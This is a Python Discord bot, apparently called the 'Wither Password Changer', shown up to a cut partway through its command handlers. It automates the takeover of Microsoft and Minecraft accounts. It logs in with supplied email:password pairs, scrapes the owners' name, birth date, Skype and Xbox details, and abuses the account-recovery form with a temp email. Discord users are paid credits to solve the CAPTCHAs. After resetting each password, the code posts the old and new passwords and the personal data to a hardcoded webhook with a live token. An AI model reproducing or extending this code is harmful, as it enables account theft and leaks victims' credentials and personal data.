import sys
import os

# Make automation package importable (works on Windows, Linux, Render, VPS)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
automation_path = os.path.join(BASE_DIR, "automation")
if os.path.isdir(automation_path):
    sys.path.insert(0, BASE_DIR)  # so "from automation.xxx" works
else:
    sys.path.insert(0, BASE_DIR)
    print("⚠️ automation/ folder not found next to main.py")

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
from datetime import datetime, timedelta
import random
from io import BytesIO
from PIL import Image
import threading
import traceback
import time
from typing import Optional

# Ignore This ->
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

os.makedirs(DATA_DIR, exist_ok=True)

# Import automation modules - NO TRY/EXCEPT, let it crash if fails
from automation.core import scrape_account_info
from automation.acsr import submit_acsr_form
from automation.acsr_continue import continue_acsr_flow
from automation.reset_password import perform_password_reset
from automation.captcha import download_captcha
import tempmail

# ==================== CONFIGURATION ====================
ADMIN_IDS = 1350376694141419581
CONFIG_FILE = "config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE = "active_sessions.json"
STATS_FILE = "bot_stats.json"

# Colors
COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO = 0x3B82F6


# ==================== DATA MANAGER ====================
class BotDataManager:

    def __init__(self):
        self.config = self.load_json(
            CONFIG_FILE, {
                "webhook_url":
                "https://discord.com/api/webhooks/1479078904269373461/lcoK2rYkyPdN6DARypzRuJp3HDhz5LgAtq5dhiMchTr7VahEMY1fND2Os93c7gLHTi5k",
                "bot_enabled": True,
                "max_concurrent_users": 100,
                "captcha_channel_id": 1488093676604227685
            })

        self.authorized_users = self.load_json(
            AUTHORIZED_USERS_FILE, {
                str(ADMIN_IDS): {
                    "authorized": True,
                    "added_by": "system",
                    "added_at": str(datetime.now())
                }
            })

        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(
            STATS_FILE, {
                "total_processed": 0,
                "total_success": 0,
                "total_failed": 0,
                "users_served": {}
            })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

    def save_config(self):
        self.save_json(CONFIG_FILE, self.config)

    def save_authorized_users(self):
        self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)

    def save_stats(self):
        self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and self.authorized_users[
            str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin, expires_at=None):
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by": str(by_admin),
            "added_at": str(datetime.now()),
            "expires_at": expires_at
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        if str(user_id) in self.authorized_users:
            del self.authorized_users[str(user_id)]
            self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp,
            "expires": datetime.now() + timedelta(minutes=5),
            "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."

        data = self.otp_data[user_id]

        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."

        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."

        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time": datetime.now()
            }
            return True, "Authentication successful!"
        else:
            data["attempts"] += 1
            return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False

        session = self.active_sessions[user_id]
        auth_time = session.get("auth_time")

        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)

        # Session expires after 24 hours
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False

        return True

    def logout(self, user_id):
        if user_id in self.active_sessions:
            del self.active_sessions[user_id]

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1

        user_str = str(user_id)
        if user_str not in self.stats["users_served"]:
            self.stats["users_served"][user_str] = {
                "processed": 0,
                "success": 0
            }

        self.stats["users_served"][user_str]["processed"] += 1
        if success:
            self.stats["users_served"][user_str]["success"] += 1

        self.save_stats()


# PASSWORD GENERATOR
def generate_wither_password():
    """Generate wither password format (Fallback if needed)"""
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"Wither{random_numbers}"


# BOT SETUP
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# HELPER FUNCTIONS
def create_embed(title, description, color, fields=None):
    embed = discord.Embed(title=title,
                          description=description,
                          color=color,
                          timestamp=datetime.now())

    if fields:
        for field in fields:
            embed.add_field(name=field.get("name", "Field"),
                            value=field.get("value", "No value"),
                            inline=field.get("inline", False))

    embed.set_footer(text="Wither Password Changer Bot • High Security")
    return embed


async def send_to_webhook(result):
    """Send results to Discord webhook"""
    webhook_url = data_manager.config.get("webhook_url")
    if not webhook_url:
        print("⚠️ No webhook URL configured")
        return

    webhook_data = {
        "embeds": [{
            "title":
            "<:password_recovery40:1467913845262778421> Password Changed Successfully",
            "color":
            COLOR_SUCCESS,
            "fields": [{
                "name": "<:Icon_Mail:1469702058868211815> Email",
                "value": f"`{result['email']}`",
                "inline": False
            }, {
                "name": "<:password:1469702059904467057> Old Password",
                "value": f"`{result['old_password']}`",
                "inline": True
            }, {
                "name": "<:password:1469702059904467057> New Password",
                "value": f"`{result['newpass']}`",
                "inline": True
            }, {
                "name": "<:name:1469702060705583359> Name",
                "value": result.get('name', 'N/A'),
                "inline": True
            }, {
                "name": "📅 DOB",
                "value": result.get('dob', 'N/A'),
                "inline": True
            }, {
                "name": "<:world:1469702063226224683> Region",
                "value": result.get('region', 'N/A'),
                "inline": True
            }, {
                "name": "<:skype:1469702061376405544> Skype ID",
                "value": result.get('skype_id', 'N/A'),
                "inline": True
            }, {
                "name": "<:skype:1469702061376405544> Skype Email",
                "value": result.get('skype_email', 'N/A'),
                "inline": True
            }, {
                "name": "<a:xbox:1469702061875527866> Xbox Gamertag",
                "value": result.get('gamertag', 'N/A'),
                "inline": True
            }],
            "footer": {
                "text":
                f"Processed by User ID: {result.get('user_id', 'Unknown')}"
            },
            "timestamp":
            datetime.now().isoformat()
        }]
    }

    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=webhook_data) as resp:
                if resp.status == 204:
                    print(f"✅ Webhook sent for {result['email']}")
                else:
                    print(f"⚠️ Webhook failed: {resp.status}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


# ACCOUNT PROCESSING
async def process_account_full(email, password, user_id, channel, newpass):
    """Complete account processing with all steps"""
    try:
        # Step 1: Scrape account info
        if channel:
            await channel.send(embed=create_embed(
                "<:Accounts:1469720768668766208> Step 1/5: Scraping Account Info",
                f"Logging into `{email}` to gather account details...",
                COLOR_INFO))

        print(f"\n{'='*60}")
        print(f"Processing: {email}")
        print(f"User ID: {user_id}")
        print(f"{'='*60}\n")

        # Run in executor to avoid blocking
        loop = asyncio.get_event_loop()
        account_info = await loop.run_in_executor(None, scrape_account_info,
                                                  email, password)

        if not account_info or account_info.get("error"):
            error_msg = account_info.get(
                "error",
                "Could not login") if account_info else "Could not login"
            if channel:
                await channel.send(embed=create_embed(
                    "❌ Login Failed",
                    f"**Error:** {error_msg}\n**Account:** `{email}`",
                    COLOR_ERROR))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": error_msg}

        print(f"✅ Account info scraped successfully")

        # Step 2: Submit ACSR form
        if channel:
            await channel.send(embed=create_embed(
                "<:Microsoft:1466088532178243751> Step 2/5: Submitting ACSR Form",
                f"✅ Scraped: **{account_info.get('name', 'Unknown')}**\n\nGenerating temp email and submitting recovery form...",
                COLOR_INFO))

        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info)

        if not captcha_image or not driver:
            if channel:
                await channel.send(embed=create_embed(
                    "❌ ACSR Submission Failed",
                    "Could not submit the ACSR form.", COLOR_ERROR))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}

        print(f"✅ ACSR form submitted, temp email: {temp_email}")

        # Step 3: Send CAPTCHA
        captcha_filename = os.path.join(
            DATA_DIR, f"captcha_{user_id}_{int(time.time())}.png")
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        # STORE DATA INCLUDING THE CUSTOM PASSWORD
        data_manager.processing_sessions[user_id] = {
            "driver": driver,
            "token": token,
            "temp_email": temp_email,
            "account_info": account_info,
            "email": email,
            "password": password,
            "desired_password": newpass,
            "captcha_file": captcha_filename,
            "captcha_attempts": 0,
            "channel_id": channel.id,
            "start_time": datetime.now(),
            "waiting_for_captcha": True
        }

        # Send to specific channel if configured, otherwise use current channel
        target_channel_id = data_manager.config.get("captcha_channel_id")
        target_channel = bot.get_channel(
            int(target_channel_id)) if target_channel_id else channel

        if target_channel:
            await target_channel.send(embed=create_embed(
                "<:captcha:1469721591196680275> CAPTCHA Required | Attempt: 1",
                "Please solve the CAPTCHA shown above:\n\n**Instructions**\n• Look at the image below\n• Type the characters you see\n• You have 5 minutes to respond",
                COLOR_WARNING),
                                      file=discord.File(captcha_filename))

        print(f"⏳ Waiting for CAPTCHA solution in channel...")
        return {"status": "captcha_pending"}

    except Exception as e:
        print(f"❌ Error in process_account_full: {str(e)}")
        traceback.print_exc()

        if channel:
            await channel.send(embed=create_embed(
                "❌ Processing Error", f"**Error:** {str(e)}", COLOR_ERROR))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}


async def continue_after_captcha(user_id, captcha_text, interaction):
    """Continue processing after CAPTCHA submission"""
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "❌ No Session", "No active CAPTCHA session found.", COLOR_ERROR),
                                                ephemeral=True)
        return

    session = data_manager.processing_sessions[user_id]
    driver = session["driver"]
    token = session["token"]
    account_info = session["account_info"]
    email = session["email"]
    password = session["password"]
    desired_password = session.get(
        "desired_password")  # Retrieve custom password

    channel = bot.get_channel(session["channel_id"])

    try:
        await interaction.response.defer(ephemeral=True)

        # Step 4: Continue ACSR
        await channel.send(embed=create_embed(
            "<:Microsoft:1466088532178243751> Step 4/5: Continuing ACSR Flow",
            "Submitting CAPTCHA and waiting for OTP from temp email...",
            COLOR_INFO))

        print(f"\n🔐 Submitting CAPTCHA: {captcha_text}")

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(None, continue_acsr_flow,
                                                driver, account_info, token,
                                                captcha_text)

        # Handle CAPTCHA retry
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1

            if session["captcha_attempts"] >= 3:
                await channel.send(embed=create_embed(
                    "❌ Maximum CAPTCHA Attempts",
                    "You've used all 3 attempts. Please start over with `/process`.",
                    COLOR_ERROR))
                await interaction.followup.send(embed=create_embed(
                    "❌ Failed", "Max CAPTCHA attempts reached.", COLOR_ERROR),
                                                ephemeral=True)

                driver.quit()
                if os.path.exists(session["captcha_file"]):
                    os.remove(session["captcha_file"])
                del data_manager.processing_sessions[user_id]
                data_manager.update_stats(user_id, False)
                return

            # Get new CAPTCHA
            print(f"❌ CAPTCHA incorrect, downloading new one...")
            new_captcha = await loop.run_in_executor(None, download_captcha,
                                                     driver)
            new_captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_captcha_filename, "wb") as f:
                f.write(new_captcha.read())

            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_captcha_filename

            await channel.send(embed=create_embed(
                "❌ Wrong CAPTCHA",
                f"Attempts remaining: **{3 - session['captcha_attempts']}**\n\nPlease try again.",
                COLOR_WARNING),
                               file=discord.File(new_captcha_filename))
            await interaction.followup.send(embed=create_embed(
                "❌ Try Again", "CAPTCHA was incorrect.", COLOR_WARNING),
                                            ephemeral=True)
            return

        if not reset_link or reset_link.startswith("ERROR"):
            await channel.send(embed=create_embed(
                "❌ ACSR Failed", f"Could not complete recovery: {reset_link}",
                COLOR_ERROR))
            await interaction.followup.send(embed=create_embed(
                "❌ Failed", f"ACSR error: {reset_link}", COLOR_ERROR),
                                            ephemeral=True)

            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        print(f"✅ Reset link received")

        # Step 5: Reset password
        await channel.send(embed=create_embed(
            "<:password:1469702059904467057> Step 5/5: Resetting Password",
            f"Opening reset link and changing password to **{desired_password}**...",
            COLOR_INFO))

        # Use custom password here
        print(f"🔑 Setting password to: {desired_password}")

        actual_password = await loop.run_in_executor(None,
                                                     perform_password_reset,
                                                     reset_link, email,
                                                     desired_password)

        if not actual_password:
            await channel.send(embed=create_embed(
                "❌ Password Reset Failed",
                "Could not change the password. Please try again.",
                COLOR_ERROR))
            await interaction.followup.send(embed=create_embed(
                "❌ Failed", "Password reset failed.", COLOR_ERROR),
                                            ephemeral=True)

            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        print(f"✅ Password changed successfully to: {actual_password}")

        # Success!
        result = {
            "email": email,
            "old_password": password,
            "newpass":
            actual_password,  # Changed from new_password to newpass to match webhook field
            "name": account_info.get("name"),
            "dob": account_info.get("dob"),
            "region": account_info.get("region"),
            "skype_id": account_info.get("skype_id"),
            "skype_email": account_info.get("skype_email"),
            "gamertag": account_info.get("gamertag"),
            "user_id": user_id
        }

        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        await channel.send(embed=create_embed(
                "<a:mcfa:1469721885259469053> Here is your MCFA account!",
                f"**Account Details Below**",
                COLOR_SUCCESS,
                [
                    {
                        "name": "<:Icon_Mail:1469702058868211815> Email",
                        "value": f"`{email}`",
                        "inline": False
                    },
                    {
                        "name": "<:password:1469702059904467057> Password",
                        "value": f"`{actual_password}`",
                        "inline": False
                    },
                ]
            )
        )

        print(f"\n{'='*60}")
        print(f"✅ COMPLETED: {email}")
        print(f"{'='*60}\n")

        # Cleanup
        driver.quit()
        if os.path.exists(session["captcha_file"]):
            os.remove(session["captcha_file"])
        del data_manager.processing_sessions[user_id]

    except Exception as e:
        print(f"❌ Error in continue_after_captcha: {str(e)}")
        traceback.print_exc()

        await channel.send(
            embed=create_embed("❌ Error", f"**Error:** {str(e)}", COLOR_ERROR))
        await interaction.followup.send(embed=create_embed(
            "❌ Error", f"Error: {str(e)}", COLOR_ERROR),
                                        ephemeral=True)

        try:
            driver.quit()
        except:
            pass
        if os.path.exists(session.get("captcha_file", "")):
            try:
                os.remove(session["captcha_file"])
            except:
                pass
        if user_id in data_manager.processing_sessions:
            del data_manager.processing_sessions[user_id]
        data_manager.update_stats(user_id, False)


# BOT EVENTS
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Check for active captcha sessions (anyone can solve)
    target_session_user_id = None
    target_channel_id = data_manager.config.get("captcha_channel_id")

    if data_manager.processing_sessions:
        for uid, session in data_manager.processing_sessions.items():
            if session.get("waiting_for_captcha"):
                # If a specific channel is set, it must be that channel. Otherwise, any channel works.
                if not target_channel_id or message.channel.id == int(
                        target_channel_id):
                    target_session_user_id = uid
                    break

    if target_session_user_id:
        session = data_manager.processing_sessions[target_session_user_id]
        # React with 👁‍🗨
        try:
            await message.add_reaction("👀")
        except:
            pass

        # Mark as processing to avoid duplicate triggers
        session["waiting_for_captcha"] = False
        await continue_after_captcha_message(target_session_user_id,
                                             message.content.strip(),
                                             message.channel, message.author)
        return

    await bot.process_commands(message)


async def continue_after_captcha_message(user_id, captcha_text, channel, user):
    """Continue processing after CAPTCHA message submission"""
    session = data_manager.processing_sessions[user_id]
    driver = session["driver"]
    token = session["token"]
    account_info = session["account_info"]
    email = session["email"]
    password = session["password"]
    desired_password = session.get("desired_password")

    # Original feedback channel
    original_channel = bot.get_channel(session["channel_id"])

    try:
        # Step 4: Continue ACSR
        print(f"\n🔐 Submitting CAPTCHA: {captcha_text}")

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(None, continue_acsr_flow,
                                                driver, account_info, token,
                                                captcha_text)

        # Handle CAPTCHA retry
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1

            # Penalty: API call to Warden Mod (NodeJS)
            api_url = data_manager.config.get("warden_api_url")
            api_key = os.environ.get("WARDEN_API_KEY")
            if api_url and api_key and channel:
                import aiohttp
                try:
                    async with aiohttp.ClientSession() as http_session:
                        payload = {"userId": str(user.id), "amount": 80}
                        headers = {"X-API-KEY": api_key, "Content-Type": "application/json"}
                        # Remove http:// if already present in api_url to avoid double protocol
                        clean_url = api_url.replace("http://", "").replace("https://", "")
                        final_url = f"http://{clean_url}/removecred"
                        async with http_session.post(final_url, json=payload, headers=headers, timeout=5) as resp:
                            if resp.status == 200:
                                await channel.send(f"⚠️ {user.mention} failed CAPTCHA. Penalty: **80 Credits** applied via Wither Mod API.")
                            else:
                                print(f"⚠️ Penalty API failed ({resp.status}): {final_url}")
                except Exception as e:
                    print(f"❌ Penalty API error ({final_url}): {e}")

            if session["captcha_attempts"] >= 3:
                if original_channel:
                    await original_channel.send(embed=create_embed(
                        "❌ Maximum CAPTCHA Attempts",
                        "You've used all 3 attempts. Please start over.",
                        COLOR_ERROR))

                driver.quit()
                if os.path.exists(session["captcha_file"]):
                    os.remove(session["captcha_file"])
                del data_manager.processing_sessions[user_id]
                data_manager.update_stats(user_id, False)
                return

            # Get new CAPTCHA
            print(f"❌ CAPTCHA incorrect, downloading new one...")
            new_captcha = await loop.run_in_executor(None, download_captcha,
                                                     driver)
            new_captcha_filename = os.path.join(
                DATA_DIR, f"captcha_{user_id}_{int(time.time())}.png")
            new_captcha.seek(0)
            with open(new_captcha_filename, "wb") as f:
                f.write(new_captcha.read())

            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_captcha_filename
            session["waiting_for_captcha"] = True

            if channel:
                await channel.send(embed=create_embed(
                    f"<:captcha:1469721591196680275> CAPTCHA Required | Attempt: {session['captcha_attempts'] + 1}",
                    "Please solve the CAPTCHA shown above:\n\n**Instructions**\n• Look at the image below\n• Type the characters you see\n• You have 5 minutes to respond",
                    COLOR_WARNING),
                                   file=discord.File(new_captcha_filename))
            return

        if not reset_link or reset_link.startswith("ERROR"):
            # Timeout case usually results in error
            if "timeout" in str(reset_link).lower():
                if channel:
                    embed = discord.Embed(
                        title="<:captcha:1469721591196680275> Captcha Timeout",
                        description="CAPTCHA timeout. Trying next account.",
                        color=COLOR_ERROR)
                    await channel.send(embed=embed)

            if original_channel:
                await original_channel.send(embed=create_embed(
                    "❌ ACSR Failed",
                    f"Could not complete recovery: {reset_link}", COLOR_ERROR))

            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        CHANNEL_ID = 1467153025692074037

        channel_captcha = bot.get_channel(CHANNEL_ID)

        # Success!
        if channel:
            # Reward: API call to Warden Mod (NodeJS)
            api_url = data_manager.config.get("warden_api_url")
            api_key = os.environ.get("WARDEN_API_KEY")
            if api_url and api_key:
                import aiohttp
                try:
                    async with aiohttp.ClientSession() as http_session:
                        payload = {"userId": str(user.id), "amount": 100}
                        headers = {"X-API-KEY": api_key, "Content-Type": "application/json"}
                        # Remove http:// if already present in api_url to avoid double protocol
                        clean_url = api_url.replace("http://", "").replace("https://", "")
                        final_url = f"http://{clean_url}/addcred"
                        async with http_session.post(final_url, json=payload, headers=headers, timeout=5) as resp:
                            if resp.status == 200:
                                await channel.send(f"🎁 {user.mention} correctly solved CAPTCHA! Reward: **100 Credits** applied via Warden Mod API.")
                            else:
                                print(f"⚠️ Reward API failed ({resp.status}): {final_url}")
                except Exception as e:
                    print(f"❌ Reward API error ({final_url}): {e}")

            embed = discord.Embed(
                title="<:captcha:1469721591196680275> Correct CAPTCHA Solved",
                description=
                f"{user.mention} has successfully solved the CAPTCHA!",
                color=COLOR_SUCCESS)
            embed.set_footer(
                text=datetime.now().strftime("%m/%d/%y, %I:%M %p"))
            await channel.send(embed=embed)

        print(f"✅ Reset link received")
        # Step 5: Reset password
        if original_channel:
            await original_channel.send(embed=create_embed(
                "<:password:1469702059904467057> Step 5/5: Resetting Password",
                f"Opening reset link and changing password to **{desired_password}**...",
                COLOR_INFO))

        actual_password = await loop.run_in_executor(None,
                                                     perform_password_reset,
                                                     reset_link, email,
                                                     desired_password)

        if not actual_password:
            if original_channel:
                await original_channel.send(embed=create_embed(
                    "❌ Password Reset Failed",
                    "Could not change the password.", COLOR_ERROR))
            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        # Success final
        result = {
            "email": email,
            "old_password": password,
            "newpass": actual_password,
            "name": account_info.get("name"),
            "dob": account_info.get("dob"),
            "region": account_info.get("region"),
            "skype_id": account_info.get("skype_id"),
            "skype_email": account_info.get("skype_email"),
            "gamertag": account_info.get("gamertag"),
            "user_id": user_id
        }

        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        if original_channel:
            await original_channel.send(embed=create_embed(
                "<:password:1469702059904467057> SUCCESS! Password Changed!", f"**Account:** `{email}`",
                COLOR_SUCCESS, [{
                    "name": "<:password:1469702059904467057> Old Password",
                    "value": f"`{password}`",
                    "inline": True
                }, {
                    "name": "<:password:1469702059904467057> New Password",
                    "value": f"`{actual_password}`",
                    "inline": True
                }]))

        # Cleanup
        driver.quit()
        if os.path.exists(session["captcha_file"]):
            os.remove(session["captcha_file"])
        del data_manager.processing_sessions[user_id]

    except Exception as e:
        print(f"❌ Error in continue_after_captcha_message: {str(e)}")
        traceback.print_exc()
        if original_channel:
            await original_channel.send(
                embed=create_embed("❌ Error", str(e), COLOR_ERROR))
        try:
            driver.quit()
        except:
            pass
        if user_id in data_manager.processing_sessions:
            del data_manager.processing_sessions[user_id]


@bot.event
async def on_ready():
    print(f"\n╔{'═'*70}╗")
    print(f"║ Wither MS PASSWORD CHANGER BOT - ONLINE{' '*37}║")
    print(f"╚{'═'*70}╝")
    print(f"\n✅ Bot User: {bot.user.name}")
    print(f"✅ Bot ID: {bot.user.id}")
    print(f"✅ Admin ID: {ADMIN_IDS}")
    print(f"✅ Authorized Users: {len(data_manager.authorized_users)}")
    print(
        f"✅ Webhook: {'✓ Configured' if data_manager.config.get('webhook_url') else '✗ Not Set'}"
    )
    print(f"\n{'='*70}\n")

    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
        
        # Testing API on startup
        api_url = data_manager.config.get("warden_api_url")
        api_key = os.environ.get("WARDEN_API_KEY")
        if api_url and api_key:
            import aiohttp
            try:
                async with aiohttp.ClientSession() as http_session:
                    clean_url = api_url.replace("http://", "").replace("https://", "")
                    final_url = f"http://{clean_url}/addcred"
                    # Test for Admin (1398214670145425500)
                    payload = {"userId": "1398214670145425500", "amount": 10}
                    headers = {"X-API-KEY": api_key, "Content-Type": "application/json"}
                    async with http_session.post(final_url, json=payload, headers=headers, timeout=5) as resp:
                        if resp.status == 200:
                            print(f"✅ API TEST SUCCESS: 10 Credits rewarded to Admin at {final_url}")
                        else:
                            print(f"❌ API TEST FAILED ({resp.status}): {final_url}")
            except Exception as e:
                print(f"❌ API TEST ERROR ({api_url}): {e}")
        else:
            print("⚠️ API Test skipped: warden_api_url or WARDEN_API_KEY not set")
            
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="Changing Passwords | made by WitherCloud"
        )
    )

print(f"\n{'='*70}")
print(f"Bot is ready! Use /help in Discord to see commands.")
print(f"{'='*70}\n")



# DECORATORS
def check_auth():

    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authorized(interaction.user.id):
            await interaction.response.send_message(embed=create_embed(
                "❌ Not Authorized", f"Contact Admins (ID: `{ADMIN_IDS}`).",
                COLOR_ERROR),
                                                    ephemeral=True)
            return False
        return True

    return app_commands.check(predicate)


def check_login():

    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authenticated(interaction.user.id):
            await interaction.response.send_message(embed=create_embed(
                "<a:Wrong:1466073421275201661> Not Logged In",
                "Use `/request_otp` and `/verify_otp` first.", COLOR_ERROR),
                                                    ephemeral=True)
            return False
        return True

    return app_commands.check(predicate)


# COMMANDS


@bot.tree.command(name="help",
                  description="View all commands and how to use the bot")
async def help_command(interaction: discord.Interaction):
    if not data_manager.is_authorized(interaction.user.id):
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Not Authorized", f"Contact admin (ID: `{ADMIN_IDS}`).",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    embed = discord.Embed(
        title="<:emoji_1:1480400701556396202> Wither Password Changer Bot",
        description="**Full ACSR Automation** - WitherCloud Edition",
        color=COLOR_PRIMARY)

    embed.add_field(name="<:password:1469702059904467057> Authentication",
                    value=("`/request_otp` - Get 6-digit code in DM\n"
                           "`/verify_otp <code>` - Login with OTP\n"
                           "`/logout` - End your session"),
                    inline=False)

    embed.add_field(
        name="<a:service:1454372369639669878> Processing",
        value=("`/process <email:pass> <newpass>` - Start processing\n"
               "`/submit_captcha <text>` - Solve CAPTCHA\n"
               "`/status` - Check your session\n"
               "`/stop` - Stop current process"),
        inline=False)

    if interaction.user.id == ADMIN_IDS:
        embed.add_field(name="<:Admin:1469724795137425551> Admin Commands",
                        value=("`/panel` - Admin Control panel\n"
                               "`/auth @user <duration>` - Grant access\n"
                               "`/unauth @user` - Remove access\n"
                               "`/list_authed` - View all authed users\n"
                               "`/set_webhook <url>` - Set webhook\n"
                               "`/stats` - View statistics"),
                        inline=False)

    embed.add_field(name="<a:tick:1454372387511472313> Quick Start",
                    value=("1️⃣ `/request_otp` → Get code in DM\n"
                           "2️⃣ `/verify_otp <code>` → Authenticate\n"
                           "3️⃣ `/process email:pass newPass123` → Start\n"
                           "4️⃣ Bot shows CAPTCHA → Solve it\n"
                           "5️⃣ `/submit_captcha <text>` → Continue\n"
                           "6️⃣ <a:tick:1454372387511472313> Password changed automatically!"),
                    inline=False)

    embed.set_footer(text="WitherCloud • Full Automation System")

    await interaction.response.send_message(embed=embed, ephemeral=False)


@bot.tree.command(name="request_otp", description="Request an OTP code")
@check_auth()
async def request_otp(interaction: discord.Interaction):
    user_id = interaction.user.id

    if data_manager.is_authenticated(user_id):
        await interaction.response.send_message(embed=create_embed(
            "ℹ<:info:1469728865554534671> Already Logged In", "You are already authenticated.",
            COLOR_INFO),
                                                ephemeral=True)
        return

    otp = data_manager.generate_otp(user_id)

    try:
        dm_embed = create_embed(
            "<:password:1469702059904467057> Your One-Time Password (OTP)",
            f"Your OTP is: **`{otp}`**\n\nThis code expires in **5 minutes**.\nUse `/verify_otp {otp}` in the server.",
            COLOR_WARNING)
        await interaction.user.send(embed=dm_embed)

        await interaction.response.send_message(embed=create_embed(
            "<a:tick:1454372387511472313> OTP Sent", "Check your direct messages for the code.",
            COLOR_SUCCESS),
                                                ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> DM Failed", "Enable DMs from server members.", COLOR_ERROR),
                                                ephemeral=True)


@bot.tree.command(name="verify_otp", description="Verify the OTP to log in")
@app_commands.describe(code="The 6-digit OTP from your DMs")
@check_auth()
async def verify_otp(interaction: discord.Interaction, code: str):
    user_id = interaction.user.id

    success, message = data_manager.verify_otp(user_id, code.strip())

    if success:
        await interaction.response.send_message(embed=create_embed(
            "<a:tick:1454372387511472313> Authentication Success",
            f"{message}\n\nYou can now use `/process` to change passwords!",
            COLOR_SUCCESS))
    else:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Authentication Failed", message, COLOR_ERROR),
                                                ephemeral=True)


@bot.tree.command(name="logout", description="End your current session")
@check_login()
async def logout_command(interaction: discord.Interaction):
    data_manager.logout(interaction.user.id)
    await interaction.response.send_message(embed=create_embed(
        "👋 Logged Out",
        "Your session has been ended. Use `/request_otp` to login again.",
        COLOR_INFO))


@bot.tree.command(name="process",
                  description="Change pass of an account (email:password)")
@app_commands.describe(
    emailpass="email:password",
    newpass="The new password you want to set (optional, defaults to generated)"
)
@check_login()
async def process_account(interaction: discord.Interaction,
                          emailpass: str,
                          newpass: Optional[str] = None):
    user_id = interaction.user.id

    # Handle optional password
    final_newpass = newpass if newpass and newpass.strip(
    ) else generate_wither_password()

    # 1. Validation: Check password length (only if user provided one)
    if newpass and len(newpass) <= 8:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Password Too Short",
            "Custom password must be **more than 8 characters** long.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    # 2. Validation: Check account format
    if ":" not in emailpass:
